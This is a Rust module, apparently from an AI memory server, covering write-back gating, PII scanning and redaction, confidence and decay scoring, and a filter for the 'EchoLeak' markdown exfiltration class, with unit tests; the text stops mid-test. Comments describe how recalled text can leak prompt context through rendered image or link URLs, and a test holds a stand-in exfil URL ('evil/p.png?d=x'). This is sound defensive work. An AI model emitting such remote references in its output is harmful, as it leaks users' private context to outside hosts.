//! v1.14.0 "Gate" — write-back gating, decay, and trust surfaces.
//!
//! The thread's missing **front door**: today `/ingest/*` writes straight into
//! long-term memory with no gate, no confidence, no decay, no access scope, and
//! no stated-vs-inferred distinction. This module closes that loop with the
//! same discipline as every release since v0.9: deterministic, zero-token,
//! human-in-the-loop, no LLM, no background worker, no autonomous anything.
//!
//! Pure, unit-testable helpers live here; handlers (`src/handlers/gate.rs`) do
//! the HTTP + transaction wiring. The human decides what becomes memory —
//! novelty/conflict/salience rank candidates, they never promote.

use rusqlite::{params, Connection};

/// Minimum content length below which a candidate is treated as filler
/// (bounded by [`MAX_SALIENCE_LEN`]). Constants tuned to the repo's ingest
/// corpus; a `ponytail:` note — corpus-calibrated, not learned.
pub const MIN_SALIENCE_LEN: usize = 24;
pub const MAX_SALIENCE_LEN: usize = 3000;

/// PII pattern kinds. `Luhn` requires the Luhn checksum to hold.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PiiKind {
    Email,
    Phone,
    Card,
}

/// Run a deterministic PII scan over `text`. Returns the distinct kinds found.
/// Structural pattern matching only (the repo's injection-quarantine posture:
/// a control, not a classifier, auditable). `Luhn`-check card numbers use the
/// standard Luhn checksum so random digit runs aren't flagged as cards.
pub fn scan_pii(text: &str) -> Vec<PiiKind> {
    let mut kinds = Vec::new();
    if has_email(text) {
        kinds.push(PiiKind::Email);
    }
    if has_phone(text) {
        kinds.push(PiiKind::Phone);
    }
    if has_luhn_card(text) {
        kinds.push(PiiKind::Card);
    }
    kinds
}

fn has_email(text: &str) -> bool {
    // Scan each '@'; check the immediate local-part (the contiguous
    // non-whitespace token before it) and a dotted domain after it. Only the
    // token boundary matters — text before the local-part ("reach me at
    // bob@...") is irrelevant. Conservative + minimal.
    let bytes = text.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'@' {
            // Local-part: walk back over the contiguous email-char run ending at i.
            let mut s = i;
            while s > 0 && is_local_char(bytes[s - 1]) {
                s -= 1;
            }
            let local_ok = i > s && s > 0; // non-empty, preceded by a boundary
            let domain = &text[i + 1..];
            let dot = domain
                .find('.')
                .is_some_and(|d| d > 0 && d < domain.len() - 1);
            // A domain must not contain whitespace before its dot (otherwise
            // "at bob@example.com or" is fine but "bob@example .com" is not).
            let domain_ok =
                dot && !domain[..domain.find('.').unwrap()].contains(char::is_whitespace);
            if local_ok && domain_ok {
                return true;
            }
        }
        i += 1;
    }
    false
}

fn is_local_char(b: u8) -> bool {
    b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-' | b'+')
}

fn has_phone(text: &str) -> bool {
    // Phone mobile pattern: a full contiguous digit run (ignoring the common
    // separators `  -().+`) of 10-15 digits with a `+` country prefix or a
    // 3-digit area code. Conservative: requires the WHOLE run to land in
    // 10..=15, so a 16-digit Luhn card run never matches here (it belongs to
    // `has_luhn_card`), and short dates/ids never reach 10.
    let mut digits = 0;
    for b in text.bytes() {
        if b.is_ascii_digit() {
            digits += 1;
        } else if matches!(b, b' ' | b'-' | b'(' | b')' | b'+' | b'.') {
            continue; // separator: stays inside the same run
        } else {
            if (10..=15).contains(&digits) {
                return true;
            }
            digits = 0;
        }
    }
    (10..=15).contains(&digits)
}

fn has_luhn_card(text: &str) -> bool {
    // Collect runs of 13-19 digits (card lengths) and Luhn-check them.
    let bytes: Vec<u8> = text.bytes().filter(|b| b.is_ascii_digit()).collect();
    let mut start = 0;
    while start < bytes.len() {
        // A "run" is contiguous digits; card numbers are usually contiguous
        // (16 digits). Check any 13..=19 length suffix window starting at a
        // digit that is preceded by a non-digit or start.
        if start > 0 && bytes[start - 1].is_ascii_digit() {
            // We're mid-run; the Luhn check happens at the run start below.
            start += 1;
            continue;
        }
        let run_end = bytes[start..]
            .iter()
            .position(|b| !b.is_ascii_digit())
            .map(|d| start + d)
            .unwrap_or(bytes.len());
        let run = &bytes[start..run_end];
        if (13..=19).contains(&run.len()) && luhn_ok(run) {
            return true;
        }
        start = run_end + 1;
    }
    false
}

/// Luhn checksum (ISO/IEC 7812). Standard double-every-second-digit-from-right
/// with the doubled>9 → -9 adjustment.
fn luhn_ok(digits: &[u8]) -> bool {
    if digits.len() < 2 {
        return false;
    }
    let mut sum = 0u32;
    let mut double = false;
    for &d in digits.iter().rev() {
        if !d.is_ascii_digit() {
            return false;
        }
        let mut v = (d - b'0') as u32;
        if double {
            v *= 2;
            if v > 9 {
                v -= 9;
            }
        }
        sum += v;
        double = !double;
    }
    sum.is_multiple_of(10)
}

/// Deterministic salience: 0..1. Longer-than-filler-but-not-verbatim-log, with
/// an entity-density bump. Length is the primary signal (bounded band); entity
/// density via the caller-supplied count is a secondary nudge. Corpus-
/// calibrated constants, documented as such (never learned, never decisive).
pub fn salience(content: &str, entity_count: usize) -> f32 {
    let len = content.trim().chars().count();
    if len < MIN_SALIENCE_LEN {
        return 0.1;
    }
    if len > MAX_SALIENCE_LEN {
        return 0.3; // verbatim log / transcript
    }
    // In-band: base on normalized length, bump slightly for entities.
    let len_score = ((len - MIN_SALIENCE_LEN) as f32
        / (MAX_SALIENCE_LEN - MIN_SALIENCE_LEN) as f32)
        .clamp(0.0, 1.0);
    let entity_bump = (entity_count.min(8) as f32 / 8.0) * 0.2;
    (0.5 * len_score + entity_bump).clamp(0.0, 1.0)
}

/// Compute `novelty = 1 − max cosine` of `embedding` against existing current
/// chunks via the vec0 index. Near-duplicate → ≈0. Uses the same in-SQL
/// `vec_quantize_int8(...,'unit')` KNN the retrieval engine uses. Returns a
/// 0..1 value; `None` when there are no current chunks to compare against
/// (first memory → novelty 1.0).
pub fn novelty(conn: &Connection, embedding: &[f32]) -> Option<f32> {
    let emb_bytes: Vec<u8> = embedding.iter().flat_map(|f| f.to_le_bytes()).collect();
    let mut knn = conn
        .prepare(
            "SELECT v.distance
             FROM vec_knowledge v
             JOIN knowledge k ON k.id = v.knowledge_id
             WHERE k.valid_to IS NULL
               AND v.embedding_int8 MATCH vec_quantize_int8(?1, 'unit')
               AND v.k = 1
             ORDER BY v.distance LIMIT 1",
        )
        .ok()?;
    let mut rows = knn
        .query_map(params![emb_bytes], |r| r.get::<_, f32>(0))
        .ok()?;
    let best = rows.next().and_then(|r| r.ok());
    rows.for_each(drop);
    best.map(|d| (1.0 - d).clamp(0.0, 1.0)).map(|sim| 1.0 - sim)
}

/// Deterministic confidence (M3). Base 1.0, each factor is a stored,
/// v1.18.2 "Transparency" M2: the model-vs-human origin marker. `source` is the
/// ingest kind; `origin` says who produced the memory. Manual/interactive →
/// human, auto-capture/assistant (`memory`) → model, bulk import + everything
/// else → `imported`. The safe fallback is `imported` — never claim human
/// authorship for an unknown path. Mirrors the migration backfill exactly.
/// (Note: vault chunks are stored with source='markdown' and map to imported —
/// only interactive `manual` writes claim human authorship.)
pub fn origin_for_source(source: Option<&str>) -> &'static str {
    match source.map(|s| s.to_ascii_lowercase()).as_deref() {
        Some("manual") => "human",
        Some("memory") => "model",
        _ => "imported",
    }
}

/// inspectable rule: connector-sourced ×0.9 (unverified external), live
/// contradiction ×0.8, inferred assertion ×0.9. Every factor is auditable; the
/// product is clamped to 0..1.
pub fn confidence(source: Option<&str>, has_conflict: bool, assertion: &str) -> f32 {
    let mut c = 1.0f32;
    if let Some(s) = source {
        let s = s.to_ascii_lowercase();
        // Connector kinds are unverified external sources (github://, webhook).
        if s.contains("connector") || s.contains("github") || s.contains("web") {
            c *= 0.9;
        }
    }
    if has_conflict {
        c *= 0.8;
    }
    if assertion == "inferred" {
        c *= 0.9;
    }
    c.clamp(0.0, 1.0)
}

/// A relevance tier from a fused RRF score (M3). Score bands are corpus-
/// calibrated; `low` is the "poison the context window" band that
/// `min_relevance` drops.
pub fn relevance_tier(score: f32) -> &'static str {
    if score >= 0.4 {
        "high"
    } else if score >= 0.2 {
        "medium"
    } else {
        "low"
    }
}

/// True when a chunk (given its `expires_at` unix ts, if any) is decayed as of
/// `now_unix`. NULL = no decay. Historical recall passes the queried instant,
/// not now, so decay and supersession compose orthogonally.
pub fn is_decayed(expires_at: Option<i64>, now_unix: i64) -> bool {
    expires_at.is_some_and(|e| e < now_unix)
}

/// v1.17.1 "Govern" M2: the effective expiry (unix ts) of a chunk. A chunk's own
/// `expires_at` always wins; when it's NULL and a per-kind retention policy
/// applies (`retention_days: kind -> days`), the default expiry is derived from
/// the chunk's creation unix ts (`created_unix`) — the row's age — so retention
/// is query-time and per-row. Returns `None` when neither an explicit expiry nor
/// a kind policy governs the chunk (no decay).
pub fn effective_expiry(
    expires_at: Option<i64>,
    created_unix: Option<i64>,
    kind: &str,
    retention_days: &std::collections::BTreeMap<String, i64>,
) -> Option<i64> {
    if let Some(e) = expires_at {
        return Some(e);
    }
    let days = retention_days.get(kind)?;
    let created = created_unix?;
    Some(created + days * 86_400)
}

/// v1.17.1 "Govern" M2: the retention reason for a decayed chunk — `per_chunk`
/// when its own `expires_at` elapsed, `kind_policy` when the kind-level default
/// elapsed (no explicit `expires_at`), else `None`. Distinguishes the two decay
/// sources so `/decayed` can tell an operator *why* a chunk is being retained/
/// reviewed, matching the plan's "surface the kind-policy expiry reason".
pub fn retention_reason(expires_at: Option<i64>, effective: Option<i64>) -> Option<&'static str> {
    match (expires_at, effective) {
        (Some(_), Some(_)) => Some("per_chunk"),
        (None, Some(_)) => Some("kind_policy"),
        _ => None,
    }
}

/// True when a principal may read resolved PII (M4). `None` (opaque/loopback)
/// always may (trusts localhost, SECURITY.md posture). In JWT mode, an
/// `admin:*/*` scope is the `pii:read` capability for v1.14 — the full
/// `<action>:<team>/<domain>` grammar can't express a `pii:read` action yet.
///
/// ponytail: a dedicated `pii:read` scope is a v2.0 ACL refinement; for now
/// "admin" is the standing "trusted reader" group, which is exactly the
/// loopback-trust posture the plan documents. Non-admin JWT principals never
/// resolve PII.
pub fn has_pii_read(principal: &Option<crate::auth::Principal>) -> bool {
    match principal {
        None => true,
        Some(p) => p
            .scopes
            .iter()
            .any(|s| s.action == crate::auth::Action::Admin),
    }
}

/// v1.14.0 "Gate" M4: output redaction. When `content` was PII-flagged at
/// ingest AND the principal does not hold `pii:read`, replace every PII span
/// with a `[redacted:<kind>]` placeholder. Loopback/opaque (`None`) and admin
/// principals get the full text (trusts localhost, SECURITY.md posture).
///
/// ponytail: this re-runs the scanner over the stored text rather than
/// tracking exact spans at write time, so it can't guarantee span-identity with
/// the original (patterns may drift). It flags the chunk, not exact offsets —
/// the deterministic "structural control, not a classifier" posture.
///
/// v1.20.19 "Vault": there is **no** write-time PII placeholder vault. A
/// fetchable stored-placeholder → raw-value map would create a personal-data
/// store to protect, competing with this default-on output redaction which
/// never persists the plaintext. This heuristic *is* the shipped control.
pub fn redact_content(
    content: &str,
    pii: bool,
    principal: &Option<crate::auth::Principal>,
) -> String {
    if !pii || has_pii_read(principal) {
        return content.to_string();
    }
    // Deterministic pass over the flagged content: mask emails, then phones
    // (10–15 digits), then cards (13–19 digit Luhn-valid runs). Order matters:
    // mask_email first so phone/card masking doesn't mangle the domain we just
    // consumed; mask_phone before mask_card because the 10–15 range never
    // overlaps a real 16–19 card, so the two passes are independent.
    let mut out = content.to_string();
    mask_email(&mut out);
    mask_phone(&mut out);
    mask_card(&mut out);
    out
}

/// v1.20.27 "Cordon": neutralize the EchoLeak markdown exfil class on emitted
/// text. Rewrites `![alt](url)` → `[alt]` and `[text](url)` → `text` so a
/// recalled chunk cannot carry a remote reference that a downstream markdown
/// renderer would dereference (image pixel / link referer exfil of surrounding
/// prompt context — the EchoLeak / CVE-2025-32711 class). Bare URLs in plain
/// prose are LEFT INTACT — rewriting `see example.com` would mangle legitimate
/// recall and is a false-positive trap; only the markdown link/image
/// *construct* is targeted.
///
/// ponytail: this is a deterministic text transform, not a markdown parser and
/// not a URL reputation service. Storage stays verbatim — this is render/
/// output only, exactly like `strip_invisible`. Ceiling: a non-markdown exfil
/// vector ("visit attacker.com" in prose) survives — that is model-discipline /
/// host-contract territory, out of scope for a deterministic strip. Runs BEFORE
/// `strip_invisible` so a bidi-wrapped `]` can't defeat the bracket scan after
/// invisible stripping.
pub fn strip_markdown_refs(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out = String::with_capacity(s.len());
    let mut i = 0usize;
    while i < bytes.len() {
        // Image construct: `![label](url)` → `[label]` (drop the `!` and the
        // `(url)`; brackets stay so the result is plain text, not itself a link).
        if bytes[i] == b'!' && i + 1 < bytes.len() && bytes[i + 1] == b'[' {
            if let Some((label_start, label_end, url_close)) = scan_link_construct(bytes, i + 1) {
                out.push('[');
                out.push_str(&s[label_start..label_end]);
                out.push(']');
                i = url_close + 1;
                continue;
            }
        }
        // Link construct: `[label](url)` → `label` (drop the brackets and url).
        if bytes[i] == b'[' {
            if let Some((label_start, label_end, url_close)) = scan_link_construct(bytes, i) {
                out.push_str(&s[label_start..label_end]);
                i = url_close + 1;
                continue;
            }
        }
        // Default: pass the char through byte-for-byte (advance on a char
        // boundary — a byte-wise `i += 1` would desync on multibyte input).
        let ch = s[i..].chars().next().expect("non-empty slice");
        out.push(ch);
        i += ch.len_utf8();
    }
    out
}

/// From an opening `[` at `open_bracket`, look for the complete link construct
/// `[label](url)`. Returns `(label_start, label_end, url_close)` byte offsets:
/// `label_start..label_end` is the inner label (exclusive of the brackets),
/// `url_close` is the index of the closing `)`. Returns `None` unless a `]` is
/// immediately followed by `(` and a matching `)` exists — the caller then
/// emits the `[` verbatim and continues. All delimiters are ASCII, so every
/// offset returned lands on a char boundary and the label slice is valid UTF-8.
fn scan_link_construct(bytes: &[u8], open_bracket: usize) -> Option<(usize, usize, usize)> {
    debug_assert_eq!(bytes[open_bracket], b'[');
    let label_start = open_bracket + 1;
    // First `]` after the opening `[` (CommonMark: the bracket contents cannot
    // themselves contain an unescaped `]`).
    let label_end_rel = bytes[label_start..].iter().position(|&b| b == b']')?;
    let label_end = label_start + label_end_rel;
    // `]` must be IMMEDIATELY followed by `(` — allowing whitespace would
    // false-positive on prose like `[note] (see ref 5)`.
    let paren_open = label_end + 1;
    if paren_open >= bytes.len() || bytes[paren_open] != b'(' {
        return None;
    }
    // First `)` after the opening `(` (nested parens in a url are not handled;
    // the trailing fragment is harmless — the remote ref is already dropped).
    let url_start = paren_open + 1;
    let url_close_rel = bytes[url_start..].iter().position(|&b| b == b')')?;
    Some((label_start, label_end, url_start + url_close_rel))
}

/// v1.20.25 "Consolidate": the read-path output seam. Applies PII redaction
/// (when the row is PII-flagged and the principal holds no `pii:read`) AND the
/// invisible-Unicode strip (bidi / zero-width / tag-block smuggling) to EVERY
/// text field a chunk may emit — content, title, snippet, evidence, heading —
/// not just `content`. The HTTP surface (recall/search, /get, /multi-get) feeds
/// every field through this, closing the raw-invisible-Unicode gap the v1.20.24
/// Sweep left on the HTTP JSON boundary. Idempotent; safe where clients re-strip.
///
/// v1.20.27 "Cordon": order is redact (PII spans) → strip_markdown_refs (drop
/// remote refs) → strip_invisible (bidi/ZW). Markdown stripping runs after PII
/// redaction and before invisible-Unicode stripping; `redact_content`'s
/// `[redacted:*]` placeholders carry no following `(...)`, so they pass through
/// `strip_markdown_refs` untouched (no interaction).
pub fn sanitize_read(s: &str, pii: bool, principal: &Option<crate::auth::Principal>) -> String {
    brain_server::strip_invisible::strip_invisible(&strip_markdown_refs(&redact_content(
        s, pii, principal,
    )))
}

/// [`sanitize_read`] for an optional field (title / snippet / heading_path).
pub fn sanitize_read_opt(
    v: Option<String>,
    pii: bool,
    principal: &Option<crate::auth::Principal>,
) -> Option<String> {
    v.map(|s| sanitize_read(&s, pii, principal))
}

/// v1.20.1 "Shield" M2(b): PII-screen a reviewer-facing `source_prompt` before
/// persist. Only the `[redacted:email]` / `[redacted:phone]` / `[redacted:card]`
/// form is stored, so a capture trigger containing a forwarded address/number/
/// card never lands raw in the review queue's provenance. Mirrors the read-path
/// masking but applied at write time (unconditional, not gated by `has_pii_read`).
pub fn screen_source_prompt(prompt: &str) -> String {
    let mut out = prompt.to_string();
    mask_email(&mut out);
    mask_phone(&mut out);
    mask_card(&mut out);
    out
}

fn mask_email(out: &mut String) {
    let mut result = String::with_capacity(out.len());
    let mut rest = out.as_str();
    while let Some(idx) = rest.find('@') {
        // Walk back over the local part (contiguous email chars).
        let head = &rest[..idx];
        let local = head
            .rsplit(|c: char| !(c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '+')))
            .next()
            .unwrap_or("");
        let local_len = local.len();
        let prefix = &head[..head.len() - local_len];
        result.push_str(prefix);
        result.push_str("[redacted:email]");
        rest = &rest[idx..];
        // Skip to the end of the domain (next whitespace or end).
        if let Some(sp) = rest.find(char::is_whitespace) {
            rest = &rest[sp..];
        } else {
            rest = "";
        }
    }
    result.push_str(rest);
    *out = result;
}

fn mask_phone(out: &mut String) {
    // Mask runs of 10-15 digits (optionally separated by ` -().+`) with the
    // placeholder, so phone numbers (and card-number runs that share the shape
    // but aren't Luhn) never leak to non-admin readers.
    let mut result = String::with_capacity(out.len());
    let bytes = out.as_bytes();
    let mut i = 0;
    let mut in_run = false;
    let mut run_start = 0;
    while i < bytes.len() {
        let b = bytes[i];
        if b.is_ascii_digit() || matches!(b, b' ' | b'-' | b'(' | b')' | b'+' | b'.') {
            if !in_run {
                in_run = true;
                run_start = i;
            }
            i += 1;
        } else {
            if in_run {
                let run = &out[run_start..i];
                if (10..=15).contains(&count_digits(run)) {
                    result.push_str("[redacted:phone]");
                } else {
                    result.push_str(run);
                }
                in_run = false;
            }
            // `i` is always on a char boundary here (runs are ASCII and we
            // consume full chars below), so slice the whole char — a byte-wise
            // `out[i..i+1]` panics on multi-byte input (e.g. '—').
            let ch = out[i..].chars().next().unwrap();
            result.push(ch);
            i += ch.len_utf8();
        }
    }
    if in_run {
        let run = &out[run_start..];
        if (10..=15).contains(&count_digits(run)) {
            result.push_str("[redacted:phone]");
        } else {
            result.push_str(run);
        }
    }
    *out = result;
}

fn count_digits(s: &str) -> usize {
    s.bytes().filter(|b| b.is_ascii_digit()).count()
}

/// v1.20.2 C1: mask Luhn-valid 13–19 digit runs (Visa/Mastercard/Amex/Discover).
/// `scan_pii` already flags these via `has_luhn_card`, but `mask_phone` only
/// covers 10–15 digits — so 16-digit cards (the most common length) leaked via
/// `redact_content` and `screen_source_prompt` until this fn was added. We
/// re-Luhn-check here (not just match digit length) so we don't redact a
/// non-card 16-digit id by accident.
fn mask_card(out: &mut String) {
    let bytes = out.as_bytes();
    let mut i = 0;
    let mut ranges_to_mask: Vec<(usize, usize)> = Vec::new();
    while i < bytes.len() {
        if bytes[i].is_ascii_digit() {
            let start = i;
            let mut digit_run: Vec<u8> = Vec::new();
            while i < bytes.len() && bytes[i].is_ascii_digit() {
                digit_run.push(bytes[i]);
                i += 1;
            }
            // Only runs in card range (13–19) that pass Luhn are cards.
            if (13..=19).contains(&digit_run.len()) && luhn_ok(&digit_run) {
                ranges_to_mask.push((start, i));
            }
        } else {
            i += 1;
        }
    }
    if ranges_to_mask.is_empty() {
        return;
    }
    // Rebuild left-to-right, splicing the placeholder in for each card run.
    let mut final_out = String::with_capacity(out.len());
    let mut cursor = 0usize;
    for (start, end) in &ranges_to_mask {
        final_out.push_str(&out[cursor..*start]);
        final_out.push_str("[redacted:card]");
        cursor = *end;
    }
    final_out.push_str(&out[cursor..]);
    *out = final_out;
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn origin_for_source_maps_kinds() {
        assert_eq!(origin_for_source(Some("manual")), "human");
        assert_eq!(origin_for_source(Some("MANUAL")), "human");
        assert_eq!(origin_for_source(Some("memory")), "model");
        assert_eq!(origin_for_source(Some("markdown")), "imported");
        assert_eq!(origin_for_source(Some("structured")), "imported");
        assert_eq!(origin_for_source(Some("weird")), "imported");
        assert_eq!(origin_for_source(None), "imported");
    }

    #[test]
    fn pii_scan_finds_email_phone_and_card() {
        assert_eq!(
            scan_pii("reach me at bob@example.com or +1 (555) 123 4567"),
            vec![PiiKind::Email, PiiKind::Phone]
        );
        // Luhn-valid card 16 digits.
        assert_eq!(scan_pii("card 4111 1111 1111 1111"), vec![PiiKind::Card]);
    }

    #[test]
    fn pii_scan_is_conservative_on_plain_text() {
        assert!(scan_pii("the meeting is on 2026-08-07 at 10:30").is_empty());
        assert!(scan_pii("version 1.2.3 and id 45678 are fine").is_empty());
    }

    #[test]
    fn luhn_checksum_accepts_valid_rejects_invalid() {
        assert!(luhn_ok(b"4111111111111111"));
        assert!(!luhn_ok(b"4111111111111112"));
        assert!(scan_pii("4111 1111 1111 1111").contains(&PiiKind::Card));
        assert!(!scan_pii("4111 1111 1111 1112").contains(&PiiKind::Card));
    }

    #[test]
    fn salience_bands_are_length_and_entity_aware() {
        // Too short = filler (low score).
        assert!(salience("short", 0) < 0.2);
        // Longer in-band content with entities scores strictly higher.
        let medium = salience("x".repeat(800).as_str(), 4);
        assert!(medium > salience("short", 0));
        // Entity density bumps the score (all else equal).
        assert!(salience("y".repeat(800).as_str(), 8) > salience("y".repeat(800).as_str(), 0));
        // Verbatim log / transcript is capped low.
        assert!(salience("y".repeat(5000).as_str(), 0) <= 0.3);
    }

    #[test]
    fn confidence_factors_are_stored_rules() {
        assert_eq!(confidence(None, false, "stated"), 1.0);
        assert!((confidence(Some("github"), false, "stated") - 0.9).abs() < 1e-6);
        assert!((confidence(None, true, "stated") - 0.8).abs() < 1e-6);
        assert!((confidence(None, false, "inferred") - 0.9).abs() < 1e-6);
        assert!((confidence(Some("github"), true, "inferred") - 0.9 * 0.8 * 0.9).abs() < 1e-6);
    }

    #[test]
    fn relevance_tiers_follow_bands() {
        assert_eq!(relevance_tier(0.5), "high");
        assert_eq!(relevance_tier(0.3), "medium");
        assert_eq!(relevance_tier(0.1), "low");
    }

    #[test]
    fn decay_is_nullable_and_instant_based() {
        assert!(!is_decayed(None, 1000));
        assert!(is_decayed(Some(500), 1000));
        assert!(!is_decayed(Some(1500), 1000));
        assert!(!is_decayed(Some(1000), 1000)); // strict <
    }

    fn admin() -> Option<crate::auth::Principal> {
        use crate::auth::{Action, Scope};
        Some(crate::auth::Principal {
            sub: "admin".into(),
            tenant: "alpha".into(),
            scopes: vec![Scope {
                action: Action::Admin,
                team: "*".into(),
                domain: "*".into(),
            }],
            jti: "t".into(),
            roles: vec![],
            manages: vec![],
        })
    }

    #[test]
    fn redaction_masks_pii_for_non_admin_and_passes_admin() {
        let text = "contact bob@example.com or +1 (555) 123 4567";
        let none: Option<crate::auth::Principal> = None; // loopback trusts localhost
                                                         // Non-admin JWT principal → masked.
        let p = crate::auth::Principal {
            sub: "user".into(),
            tenant: "alpha".into(),
            scopes: vec![crate::auth::Scope {
                action: crate::auth::Action::Read,
                team: "alpha".into(),
                domain: "alpha".into(),
            }],
            jti: "t".into(),
            roles: vec![],
            manages: vec![],
        };
        let masked = redact_content(text, true, &Some(p));
        assert!(masked.contains("[redacted:email]"));
        assert!(masked.contains("[redacted:phone]"));
        assert!(!masked.contains("bob@example.com"));
        assert!(!masked.contains("555"));
        // Loopback + admin → full text.
        assert_eq!(redact_content(text, true, &none), text);
        assert_eq!(redact_content(text, true, &admin()), text);
        // Non-flagged content passes through unmasked for everyone.
        assert_eq!(redact_content("plain text", false, &none), "plain text");
    }

    /// v1.20.1 "Shield" M2(b): a reviewer-facing `source_prompt` is screened at
    /// persist time — only the `[redacted:…]` form is stored, an email/phone
    /// in the capture-trigger text never lands raw in the review queue.
    #[test]
    fn source_prompt_is_pii_screened_and_rendered() {
        let screened =
            screen_source_prompt("user forwarded bob@example.com and called +1 (555) 123 4567");
        assert!(screened.contains("[redacted:email]"));
        assert!(screened.contains("[redacted:phone]"));
        assert!(!screened.contains("bob@example.com"));
        // Benign prompts pass through untouched (no false redaction of plain text).
        assert_eq!(
            screen_source_prompt("user asked to note the deadline"),
            "user asked to note the deadline"
        );
    }

    /// v1.20.2 C1: a Luhn-valid 16-digit Visa test card must be masked. Before
    /// this fix `mask_phone` (10–15 digits) missed it, so a card in a PII-flagged
    /// chunk leaked via `redact_content` and `screen_source_prompt`. We verify
    /// both the source_prompt screen AND the read-path `redact_content` (the
    /// regression spans both surfaces).
    #[test]
    fn redaction_masks_luhn_valid_16_digit_cards() {
        // Visa test card 4111 1111 1111 1111 — Luhn-valid, 16 digits.
        // `mask_phone` (10..=15) misses it; only `mask_card` catches it.
        let mut s = "card 4111111111111111 here".to_string();
        mask_card(&mut s);
        assert!(s.contains("[redacted:card]"), "16-digit card masked: {s}");
        assert!(
            !s.contains("4111111111111111"),
            "raw card not in output: {s}"
        );
        // A 16-digit NON-Luhn run must NOT be masked (could be an id).
        let mut clean = "id 4111111111111112 here".to_string();
        mask_card(&mut clean);
        assert!(
            !clean.contains("[redacted:card]"),
            "non-card id untouched: {clean}"
        );
        // Multiple cards in one string.
        let mut multi = "4111111111111111 and 4012888888881881".to_string();
        mask_card(&mut multi);
        assert_eq!(multi.matches("[redacted:card]").count(), 2);
        // `scan_pii` + `redact_content` end-to-end for a non-admin reader.
        let pii = !scan_pii("card 4111111111111111").is_empty();
        assert!(pii, "scan_pii flags the 16-digit card");
        let redacted = redact_content(
            "card 4111111111111111",
            true,
            &Some(crate::auth::Principal {
                sub: "reader".into(),
                tenant: "team-a".into(),
                scopes: vec![],
                jti: "test".into(),
                roles: vec![],
                manages: vec![],
            }),
        );
        assert!(
            redacted.contains("[redacted:card]"),
            "redact_content masks card: {redacted}"
        );
        // And source_prompt screen also catches it.
        let prompt = screen_source_prompt("forwarded card 4111111111111111");
        assert!(
            prompt.contains("[redacted:card]"),
            "source_prompt masks card: {prompt}"
        );
    }
    /// Live panic fix: `mask_phone` sliced `out[i..i+1]` by byte index, which
    /// panics on a multi-byte char (e.g. an em-dash) adjacent to a digit run.
    /// A PII-flagged chunk containing such a char crashed the worker thread on
    /// the read path. Redaction must survive non-ASCII input and still mask.
    #[test]
    fn redact_content_survives_multibyte_chars_and_still_masks() {
        let none: Option<crate::auth::Principal> = None;
        let p = crate::auth::Principal {
            sub: "user".into(),
            tenant: "alpha".into(),
            scopes: vec![crate::auth::Scope {
                action: crate::auth::Action::Read,
                team: "alpha".into(),
                domain: "alpha".into(),
            }],
            jti: "t".into(),
            roles: vec![],
            manages: vec![],
        };
        // em-dash (3-byte) right after a valid 10-digit run — the exact boundary
        // that panicked (`out[i..i+1]` on the em-dash's first byte is not a char).
        let text = "call 5551234567— then done";
        let masked = redact_content(text, true, &Some(p.clone()));
        assert!(!masked.contains("5551234567"));
        assert!(masked.contains("[redacted:phone]"));
        assert!(masked.contains("done"));
        // Full-width digit + CJK char (multi-byte) after a run.
        let masked2 = redact_content("v1 555 1234 5678 日本語", true, &Some(p));
        assert!(!masked2.contains("555"));
        assert!(masked2.contains("[redacted:phone]"));
        assert!(masked2.contains("日本語"));
        // Loopback still passes the same content through unmasked, no panic.
        assert_eq!(redact_content(text, true, &none), text);
    }

    #[test]
    fn has_pii_read_admin_or_loopback() {
        let none: Option<crate::auth::Principal> = None;
        assert!(has_pii_read(&none));
        assert!(has_pii_read(&admin()));
        let p = crate::auth::Principal {
            sub: "user".into(),
            tenant: "alpha".into(),
            scopes: vec![crate::auth::Scope {
                action: crate::auth::Action::Read,
                team: "alpha".into(),
                domain: "alpha".into(),
            }],
            jti: "t".into(),
            roles: vec![],
            manages: vec![],
        };
        assert!(!has_pii_read(&Some(p)));
    }

    #[test]
    fn novelty_without_vec_index_is_safe_none() {
        // vec0 requires the sqlite-vec extension, which a bare unit test can't
        // load (it's registered by the server at startup). Assert the safe
        // path: no vec_knowledge table → `novelty` returns None (the caller
        // treats None as "first memory → novelty 1.0"), never panics.
        let conn = Connection::open_in_memory().unwrap();
        conn.execute_batch("CREATE TABLE knowledge(id INTEGER PRIMARY KEY, valid_to TEXT);")
            .unwrap();
        assert!(novelty(&conn, &[0.1, 0.2]).is_none());
    }

    /// v1.17.1 M2: a chunk's own `expires_at` always wins over the kind policy.
    #[test]
    fn effective_expiry_own_expires_at_wins() {
        let policy = std::collections::BTreeMap::from([("fact".to_string(), 365)]);
        assert_eq!(
            effective_expiry(Some(500), Some(100), "fact", &policy),
            Some(500)
        );
        assert_eq!(
            effective_expiry(Some(500), None, "fact", &policy),
            Some(500)
        );
    }

    /// v1.17.1 M2: no explicit expiry → the kind-default derives from created_unix.
    #[test]
    fn effective_expiry_kind_default_from_creation() {
        let policy = std::collections::BTreeMap::from([("fact".to_string(), 365)]);
        let created = 1_700_000_000;
        assert_eq!(
            effective_expiry(None, Some(created), "fact", &policy),
            Some(created + 365 * 86_400)
        );
        // Unknown kind with no policy → no decay.
        assert_eq!(
            effective_expiry(None, Some(created), "episodic", &policy),
            None
        );
        // Kind policy but no created_at → no decay (can't derive an age).
        assert_eq!(effective_expiry(None, None, "fact", &policy), None);
    }

    /// v1.17.1 M2: `/decayed` distinguishes the two decay sources.
    #[test]
    fn retention_reason_distinguishes_per_chunk_and_kind_policy() {
        let policy = std::collections::BTreeMap::from([("fact".to_string(), 365)]);
        // Explicit expiry elapsed → per_chunk.
        let e = effective_expiry(Some(500), Some(100), "fact", &policy);
        assert_eq!(retention_reason(Some(500), e), Some("per_chunk"));
        // Kind-default elapsed (no explicit) → kind_policy.
        let e2 = effective_expiry(None, Some(100), "fact", &policy);
        assert_eq!(retention_reason(None, e2), Some("kind_policy"));
        // Not decayed → None.
        assert_eq!(retention_reason(None, None), None);
    }

    /// v1.20.27 "Cordon": the markdown link/image construct is neutralized —
    /// `![alt](url)` → `[alt]` (drop `!` + url), `[text](url)` → `text` (drop
    /// brackets + url). Bare prose and labels survive.
    #[test]
    fn strip_markdown_neutralizes_image_and_link() {
        let input = "see ![logo](https://evil/p.png?d=x) and [docs](http://evil/d)";
        assert_eq!(strip_markdown_refs(input), "see [logo] and docs");
